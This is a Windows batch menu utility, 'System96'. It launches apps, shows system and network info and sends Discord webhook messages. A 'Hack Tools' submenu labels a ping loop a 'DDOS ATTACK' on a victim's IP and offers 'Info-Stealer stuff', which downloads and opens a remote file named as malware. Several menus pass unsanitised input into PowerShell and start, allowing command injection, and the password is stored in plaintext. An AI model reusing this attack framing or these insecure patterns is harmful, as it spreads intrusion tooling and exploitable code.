��&cls
@echo off
goto Password
setx PASSNEED=1
:Password
title LockScreen -Made by Pyscho
cls
echo [38;2;250;50;250m .d8888b.                    888                           .d8888b.   .d8888b.  [0m
echo [38;2;240;60;240m d88P  Y88b                   888                          d88P  Y88b d88P  Y88b [0m
echo [38;2;230;70;230m Y88b.                        888                          888    888 888   [0m
echo [38;2;220;80;220m "Y888b.   888  888 .d8888b  888888 .d88b.  88888b.d88b.  Y88b. d888 888d888b.  [0m
echo [38;2;210;90;210m    "Y88b. 888  888 88K      888   d8P  Y8b 888 "888 "88b  "Y888P888 888P "Y88b[0m
echo [38;2;200;100;200m      "888 888  888 "Y8888b. 888   88888888 888  888  888        888 888    888 [0m
echo [38;2;190;110;190m Y88b  d88P Y88b 888      X88 Y88b. Y8b.     888  888  888 Y88b  d88P Y88b  d88P [0m
echo [38;2;180;120;180m "Y8888P"   "Y88888  88888P'  "Y888 "Y8888  888  888  888  "Y8888P"   "Y8888P"  [0m
echo [38;2;170;130;170m                888                                                             [0m
echo [38;2;160;140;160m           Y8b d88P                                                             [0m
echo [38;2;150;150;150m            "Y88P"                                                              [0m

if "%PASSNEED%"=="1" (
    goto PasswordY
) else if "%PASSNEED%"=="0" (
    goto Menu
) else (
    echo Invalid value for PASSNEED
)


:PasswordY
echo To use this tool enter the password.

set /p userInput=Enter the password: 

if /i "%userInput%"=="%Password%" (
    echo [38;2;0;255;0mWELCOME[0m
    timeout /t 1 >nul
    goto menu
) else (
    echo [38;2;255;0;0mBADPASSWORD[0m
    timeout /t 1 >nul
    goto Password
)






                                     
:menu
title Menu -Made by pyscho
color 7
cls
echo [38;2;250;50;250m .d8888b.                    888                           .d8888b.   .d8888b.  [0m
echo [38;2;240;60;240m d88P  Y88b                   888                          d88P  Y88b d88P  Y88b [0m
echo [38;2;230;70;230m Y88b.                        888                          888    888 888   [0m
echo [38;2;220;80;220m "Y888b.   888  888 .d8888b  888888 .d88b.  88888b.d88b.  Y88b. d888 888d888b.  [0m
echo [38;2;210;90;210m    "Y88b. 888  888 88K      888   d8P  Y8b 888 "888 "88b  "Y888P888 888P "Y88b[0m
echo [38;2;200;100;200m      "888 888  888 "Y8888b. 888   88888888 888  888  888        888 888    888 [0m
echo [38;2;190;110;190m Y88b  d88P Y88b 888      X88 Y88b. Y8b.     888  888  888 Y88b  d88P Y88b  d88P [0m
echo [38;2;180;120;180m "Y8888P"   "Y88888  88888P'  "Y888 "Y8888  888  888  888  "Y8888P"   "Y8888P"  [0m
echo [38;2;170;130;170m                888                                                             [0m
echo [38;2;160;140;160m           Y8b d88P                                                             [0m
echo [38;2;150;150;150m            "Y88P"                                                              [0m

echo [38;2;147;196;125m-----------------------------------------------[0m
echo  [38;2;106;168;79mCommand Prompt and app assister  MADE BY Pyscho[0m 
echo [38;2;0;75;0m-----------------------------------------------[0m
echo   1.Apps
echo   2.Console 
echo   3.Extra 
echo   4.Power/Sleep          
echo   5.Exit                        
echo ----------------------------------

set choice=  ;
set /p choice="Enter your choice (1-5): "

if "%choice%"=="1" goto Apps
if "%choice%"=="2" goto console
if "%choice%"=="3" goto Extra
if "%choice%"=="4" goto power
if "%choice%"=="5" goto exit

echo Invalid choice. Please try again.
pause
goto menu

:power
title PowerMenu
color c
cls
echo [38;2;255;100;100m-----------------------------------------------[0m
echo [38;2;255;100;100mPower Options[0m 
echo [38;2;255;100;100m-----------------------------------------------[0m
echo   [38;2;255;0;0m1.Shutdown[0m
echo   [38;2;200;0;0m2.Lock[0m
echo   [38;2;150;0;0m3.Remote Shutdown[0m
echo   [38;2;100;0;0m4.Restart System92[0m
echo   [38;2;100;0;0m5.Menu[0m                
echo [38;2;255;100;100m-----------------------------------------------[0m

set choice=  ;
set /p choice="Enter your choice (1-5): "

if "%choice%"=="1" goto SD
if "%choice%"=="2" goto Lock
if "%choice%"=="3" goto RS
if "%choice%"=="4" goto R96
if "%choice%"=="5" goto Menu


echo Invalid choice. Please try again.
pause
goto power


:RS
shutdown -i
pause
goto power

:R96
echo Restarting...
timeout /t 2 >nul
%~f0
start %0

:SD
title Shutdown?
cls
color 4
echo -----------------------------------------
echo Are you sure to shutdown %COMPUTERNAME% ?
echo -----------------------------------------
echo 1.Yes    2.No
echo ---------------------

set choice=  ;
set /p choice="Enter your choice (1-2): "

if "%choice%"=="1" shutdown /s /f /t 0
if "%choice%"=="2" goto power

echo Invalid choice. Please try again.
pause
goto SD

:Lock
title Lock?
cls
color 4
echo -----------------------------------------
echo Are you sure to Lock %COMPUTERNAME% ?
echo -----------------------------------------
echo 1.Yes    2.No
echo ---------------------

set choice=  ;
set /p choice="Enter your choice (1-2): "

if "%choice%"=="1" rundll32.exe user32.dll,LockWorkStation
if "%choice%"=="2" goto power

echo Invalid choice. Please try again.
pause
goto Lock








:exit
title Exit
cls
color 4
echo ---------------------
echo Are you sure to exit?
echo ---------------------
echo 1.Yes    2.No
echo ---------------------

set choice=  ;
set /p choice="Enter your choice (1-2): "

if "%choice%"=="1" exit
if "%choice%"=="2" goto menu

echo Invalid choice. Please try again.
pause
goto exit



:Apps
title Apps
cls
color 7
echo [38;2;250;50;250m .d8888b.                    888                           .d8888b.   .d8888b.  [0m
echo [38;2;240;60;240m d88P  Y88b                   888                          d88P  Y88b d88P  Y88b [0m
echo [38;2;230;70;230m Y88b.                        888                          888    888 888   [0m
echo [38;2;220;80;220m "Y888b.   888  888 .d8888b  888888 .d88b.  88888b.d88b.  Y88b. d888 888d888b.  [0m
echo [38;2;210;90;210m    "Y88b. 888  888 88K      888   d8P  Y8b 888 "888 "88b  "Y888P888 888P "Y88b[0m
echo [38;2;200;100;200m      "888 888  888 "Y8888b. 888   88888888 888  888  888        888 888    888 [0m
echo [38;2;190;110;190m Y88b  d88P Y88b 888      X88 Y88b. Y8b.     888  888  888 Y88b  d88P Y88b  d88P [0m
echo [38;2;180;120;180m "Y8888P"   "Y88888  88888P'  "Y888 "Y8888  888  888  888  "Y8888P"   "Y8888P"  [0m
echo [38;2;170;130;170m                888                                                             [0m
echo [38;2;160;140;160m           Y8b d88P                                                             [0m
echo [38;2;150;150;150m            "Y88P"                                                              [0m

echo ------------------------
echo Choose a program to open
echo ------------------------
echo 1. Task Time
echo 2. Control Panel
echo 3. Fresh Terminal
echo 4. Window Updates
echo 5. Start
echo 6. Kill 
echo 7. Menu
echo ---------------------

set choice=  ;
set /p choice="Enter your choice (1-6): "


if "%choice%"=="1" goto TaskMSC
if "%choice%"=="2" goto CTRLP
if "%choice%"=="3" goto NEWCMD
if "%choice%"=="4" goto WindowUpdate
if "%choice%"=="5" goto StartAPP
if "%choice%"=="6" goto Kill
if "%choice%"=="7" goto Menu



echo Invalid choice. Please try again.
pause
goto Apps


:Kill
echo Enter a FULL program name to [38;2;255;0;0mkill[0m. 
set /p userInput=Enter a value:
kill %userInput%
pause
goto Apps

:StartAPP
Echo.
Echo Type a link or program to start links must start with Https://    programs must have FUll name encluding extension.
set /p userInput=Enter a value:
start %userInput%
pause
goto Apps

:TaskMSC
start taskschd.msc
goto Apps

:CTRLP
start Control
goto Apps

:NEWCMD
start CMD
goto Apps

:WindowUpdate
if "%choice%"=="2" goto CTRLP
start ms-settings:windowsupdate
goto Apps





:Ipconfig
title Ipconfig
cls
echo -----------------------------------------------------
echo                  Choose a Ipconfig Option
echo -----------------------------------------------------
echo 1. All info                    All ip information
echo 2. Private IP                  Private ip DONT SHARE
echo 3. Network Ip
echo 4. Console
echo -----------------------------------------------------

set choice=  ;
set /p choice="Enter your choice (1-4): "

if "%choice%"=="1" goto IPCMD
if "%choice%"=="2" goto IPCMD2
if "%choice%"=="3" goto NWI
if "%choice%"=="4" goto Console

echo Invalid choice. Please try again.
pause
goto Ipconfig

:NWI
nslookup myip.opendns.com resolver1.opendns.com
pause
goto ipconfig

:IPCMD
ipconfig /all
pause
goto Ipconfig

:IPCMD2
ipconfig | findstr /i "IPv4"
pause
goto Ipconfig






:Console
title Console
color 7
cls
echo [38;2;250;50;250m .d8888b.                    888                           .d8888b.   .d8888b.  [0m
echo [38;2;240;60;240m d88P  Y88b                   888                          d88P  Y88b d88P  Y88b [0m
echo [38;2;230;70;230m Y88b.                        888                          888    888 888   [0m
echo [38;2;220;80;220m "Y888b.   888  888 .d8888b  888888 .d88b.  88888b.d88b.  Y88b. d888 888d888b.  [0m
echo [38;2;210;90;210m    "Y88b. 888  888 88K      888   d8P  Y8b 888 "888 "88b  "Y888P888 888P "Y88b[0m
echo [38;2;200;100;200m      "888 888  888 "Y8888b. 888   88888888 888  888  888        888 888    888 [0m
echo [38;2;190;110;190m Y88b  d88P Y88b 888      X88 Y88b. Y8b.     888  888  888 Y88b  d88P Y88b  d88P [0m
echo [38;2;180;120;180m "Y8888P"   "Y88888  88888P'  "Y888 "Y8888  888  888  888  "Y8888P"   "Y8888P"  [0m
echo [38;2;170;130;170m                888                                                             [0m
echo [38;2;160;140;160m           Y8b d88P                                                             [0m
echo [38;2;150;150;150m            "Y88P"                                                              [0m

echo ----------------------------------
echo Commands
echo ----------------------------------
echo   1.Ipconfig
echo   2.Systeminfo              
echo   3.FILES
echo   4.Ping 
echo   5.TaskManger
echo   6.MENU                 
echo ----------------------------------

set choice=  ;
set /p choice="Enter your choice (1-6): "

if "%choice%"=="1" goto Ipconfig
if "%choice%"=="2" goto Systeminfo
if "%choice%"=="3" goto FILES
if "%choice%"=="4" goto Ping
if "%choice%"=="5" goto TASKMANGER
if "%choice%"=="6" goto menu

echo Invalid choice. Please try again.
pause
goto Console



:TASKMANGER
start taskmgr
pause
goto Console








:Ping
echo Type !exit! to exit
set /p userInput=Enter a value:

if /i "%userInput%"=="!Exit!" (
    goto Console

)else (
    ping "%userInput%"
)
pause
goto Ping




:FILES
title Files
color 7
cls
echo ----------------------------------
echo File commands 
echo ----------------------------------
echo   1.DIR     reads whats in file
echo   2.Open    change directory     
echo   3.Storage Left        
echo   4.Console                  
echo ----------------------------------

set choice=  ;
set /p choice="Enter your choice (1-2): "

if "%choice%"=="1" goto DIR
if "%choice%"=="2" goto Open
if "%choice%"=="3" goto StorageLeft
if "%choice%"=="4" goto Console

echo Invalid choice. Please try again.
pause
goto FILES




:StorageLeft
for /f "tokens=2 delims==" %%A in ('wmic logicaldisk where "DeviceID='C:'" get Size /format:value') do set DriveSize=%%A

if "%DriveSize%"=="" (
    echo Error: Unable to fetch the drive size. Ensure the drive exists.
    pause
    exit /b
)

set /a KB=%DriveSize% / 1024
set /a MB=%KB% / 1024
set /a GB=%MB% / 1024
set /a TB=%GB% / 1024

echo Drive Size (C:):
echo -------------------------
echo Bytes     : %DriveSize%
echo Kilobytes : %KB%
echo Megabytes : %MB%
echo Gigabytes : %GB%
echo Terabytes : %TB%
pause
goto Files


pause

:Open
Title Change directory -Made by Pyscho
cls
echo Type a directory.              Type !Exit! to go back
set /p userInput=

if /i "%userInput%"=="!Exit!" (
    goto Files
) else (
    cd %userInput%
)
pause
goto Open


:Dir
title Dir -Made by Pyscho
cls
echo This will list the contents of what you have entered in the open menu. Type !Exit! to go back
set /p userInput=Enter a value:

if /i "%userInput%"=="!Exit!" (
    goto Files
) else (
    cd %userInput%
)
pause
goto Dir




:Systeminfo
title SystemInfo -Made by Pyscho
color 7
cls
echo ----------------------------------
echo System Options
echo ----------------------------------
echo   1.GPU INFO
echo   2.CPU INFO             
echo   3.RAM INFO
echo   4.DISK INFO  
echo   5.Console               
echo ----------------------------------

set choice=  ;
set /p choice="Enter your choice (1-5): "

if "%choice%"=="1" goto GPUINFO
if "%choice%"=="2" goto CPUINFO
if "%choice%"=="3" goto RAMINFO
if "%choice%"=="4" goto DISKINFO
if "%choice%"=="5" goto Console

echo Invalid choice. Please try again.
pause
goto Console

:GPUINFO
wmic path win32_videocontroller get name
pause
goto Systeminfo

:CPUINFO
wmic cpu get name,numberofcores,numberoflogicalprocessors
pause
goto Systeminfo

:RAMINFO
wmic memorychip get capacity
pause
goto Systeminfo

:DISKINFO
wmic diskdrive get model,size
pause
goto Systeminfo

:Extra 
title Extras -Made by Pyscho
color 7
cls
echo [38;2;250;50;250m .d8888b.                    888                           .d8888b.   .d8888b.  [0m
echo [38;2;240;60;240m d88P  Y88b                   888                          d88P  Y88b d88P  Y88b [0m
echo [38;2;230;70;230m Y88b.                        888                          888    888 888   [0m
echo [38;2;220;80;220m "Y888b.   888  888 .d8888b  888888 .d88b.  88888b.d88b.  Y88b. d888 888d888b.  [0m
echo [38;2;210;90;210m    "Y88b. 888  888 88K      888   d8P  Y8b 888 "888 "88b  "Y888P888 888P "Y88b[0m
echo [38;2;200;100;200m      "888 888  888 "Y8888b. 888   88888888 888  888  888        888 888    888 [0m
echo [38;2;190;110;190m Y88b  d88P Y88b 888      X88 Y88b. Y8b.     888  888  888 Y88b  d88P Y88b  d88P [0m
echo [38;2;180;120;180m "Y8888P"   "Y88888  88888P'  "Y888 "Y8888  888  888  888  "Y8888P"   "Y8888P"  [0m
echo [38;2;170;130;170m                888                                                             [0m
echo [38;2;160;140;160m           Y8b d88P                                                             [0m
echo [38;2;150;150;150m            "Y88P"                                                              [0m

echo ----------------------------------
echo Menu
echo ----------------------------------
echo   [38;2;100;100;255m1.DiscordWebHook Controller[0m  
echo   2.Custom MSG box 
echo   3.Change System96 Password  
echo   4.Lock on/off  
echo   [38;2;0;150;150m5.Secret Tools[0m             
echo   6.MENU            
echo ----------------------------------

set choice=  ;
set /p choice="Enter your choice (1-3): "

if "%choice%"=="1" goto WebHook
if "%choice%"=="2" goto CUSTOMMSG
if "%choice%"=="3" goto ChangePass
if "%choice%"=="4" goto Lock!
if "%choice%"=="5" goto Secret
if "%choice%"=="6" goto Menu


echo Invalid choice. Please try again.
pause
goto Console


:Lock!
set choice=  ;
cls
echo 1 yes  2 no
set /p choice="Enter your choice (1-2): "


if "%choice%"=="1" setx PASSNEED 1
if "%choice%"=="2" setx PASSNEED 0

if not "%choice%"=="1" if not "%choice%"=="2" (
    echo [38;2;255;0;0mInvalid choice. Please try again.[0m
    pause
    goto Lock!
)
pause
goto Extra

:CUSTOMMSG 
Echo Window Title
set /p message1="Enter the first message: "
Echo Message
set /p message2="Enter the second message: "

echo Window Title: %message1%
echo Message : %message2%

echo.
pause

powershell -Command "& {Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('%message2%', '%message1%', 'OK', [System.Windows.Forms.MessageBoxIcon]::Information);}"
pause
goto Extra





:WebHook
color 1
cls
echo Enter your Discord webhook URL: 
set /p webhook=Webhook URL: 
echo Webhook has been set
timeout /t 1 >nul
cls
goto WEBHOOK2

:WEBHOOK2
echo Type your message below. Type !END! to return.
set /p message=Message: 

if "%message%"=="!END!" goto Extra

:: Send the message to the Discord webhook using PowerShell
powershell -Command ^
    "Invoke-WebRequest -Uri '%webhook%' -Method Post -Body (@{content='%message%'} | ConvertTo-Json -Depth 10) -ContentType 'application/json'"

echo Message sent!
goto WEBHOOK2



:Secret
title Hack Tools -Made by Pyscho
cls
echo [38;2;250;50;250m .d8888b.                    888                           .d8888b.   .d8888b.  [0m
echo [38;2;240;60;240m d88P  Y88b                   888                          d88P  Y88b d88P  Y88b [0m
echo [38;2;230;70;230m Y88b.                        888                          888    888 888   [0m
echo [38;2;220;80;220m "Y888b.   888  888 .d8888b  888888 .d88b.  88888b.d88b.  Y88b. d888 888d888b.  [0m
echo [38;2;210;90;210m    "Y88b. 888  888 88K      888   d8P  Y8b 888 "888 "88b  "Y888P888 888P "Y88b[0m
echo [38;2;200;100;200m      "888 888  888 "Y8888b. 888   88888888 888  888  888        888 888    888 [0m
echo [38;2;190;110;190m Y88b  d88P Y88b 888      X88 Y88b. Y8b.     888  888  888 Y88b  d88P Y88b  d88P [0m
echo [38;2;180;120;180m "Y8888P"   "Y88888  88888P'  "Y888 "Y8888  888  888  888  "Y8888P"   "Y8888P"  [0m
echo [38;2;170;130;170m                888                                                             [0m
echo [38;2;160;140;160m           Y8b d88P                                                             [0m
echo [38;2;150;150;150m            "Y88P"                                                              [0m
echo.
echo [38;2;255;0;0mDO NOT USE THIS FOR HACKING THIS IS JUST A TOOL.[0m
echo ----------------------------------
echo Special Tools
echo ----------------------------------
echo   1.DDOS ATTACK  [38;2;255;0;0mDO NOT USE THIS FOR BAD INTENT.ONLY USE THIS TO PEOPLE IF YOU HAVE THEIR CONSENT.[0m
echo   2.Info-Stealer stuff [38;2;255;0;0mDO NOT USE THIS FOR BAD STUFF.[0m
echo   3.MENU            
echo ----------------------------------

set choice=  ;
set /p choice="Enter your choice (1-2): "

if "%choice%"=="1" goto DDOS
if "%choice%"=="2" goto MalwareMacker
if "%choice%"=="3" goto menu




echo Invalid choice. Please try again.
pause
goto Secret



:MalwareMacker
Echo Are you sure you want to download this setup file?
echo 1.Yes
echo 2.Nah
set choice=  ;
set /p choice="Enter your choice (1-2): "

if "%choice%"=="1" goto MalwareMackerYES
if "%choice%"=="2" goto Secret

:MalwareMackerYES
curl -L -o SYSTEM96MALWARE.TXT https://raw.githubusercontent.com/Pyscho1231239/MalwareKinda/main/SYSTEM96MALWARE.TXT
timeout /t 5 >nul
start SYSTEM96MALWARE.TXT
pause
goto Secret




:DDOS
echo Enter the victim's IP. PRESS any key to end and run Goto Secret.
set /p userInput=Enter the IP or hostname to ping: 

:: Check if the input is empty
if "%userInput%"=="" (
    echo IP must be specified.
    goto DDOS
)

:loop15
ping %userInput% -n 1
timeout /t 1 >nul

:: Check if any key is pressed to exit
echo Press any key to stop...
choice /c y /n /t 1 /d y >nul
if errorlevel 1 (
    goto secret
)

goto loop15




:Changepass

:Changepass
:: Run PowerShell command once and capture its output
for /f "delims=" %%A in ('powershell -Command "& {Add-Type -AssemblyName Microsoft.VisualBasic; $pass = [Microsoft.VisualBasic.Interaction]::InputBox('Enter the new password:', 'Password Prompt'); $pass}"') do set pass=%%A

:: Set the new password using setx
setx Password "%pass%"

echo Password has been changed to: %pass%
pause
goto menu



::COLORS
echo [38;2;255;0;0mHi[0m           Red
echo [38;2;255;165;0mHi[0m          Orange
echo [38;2;255;255;0mHi[0m           Yellow
echo [38;2;0;255;0mHi[0m             Green
echo [38;2;0;0;255mHi[0m            Blue
echo [38;2;250;50;250m[0m         Purple



